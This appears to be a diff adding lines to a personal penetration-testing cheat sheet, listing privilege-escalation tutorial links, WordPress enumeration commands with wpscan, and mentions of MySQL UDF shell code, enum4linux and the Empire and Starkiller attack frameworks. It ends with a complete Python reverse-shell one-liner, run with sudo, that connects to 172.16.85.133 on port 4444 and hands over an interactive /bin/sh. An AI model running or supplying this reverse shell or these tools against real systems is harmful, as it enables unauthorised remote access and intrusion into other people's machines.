@@ -7,3 +7,20 @@ https://fuzzysecurity.com/tutorials/16.html   # win privi escalate
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/   # linux privi escalate
 
 rsg IP port type   # rsg IP port python
+
+#for wordpress
+  wpscan --url xxx --enumerate ap,at,cb,dbe
+  wpscan --api-token $WPSCAN
+
+#UDF   mysql exec shell code
+
+#get domain info of a linux host
+enum4linux 
+
+empire
+
+starkiller
+
+#reverse shell
+sudo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.85.133",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+ 
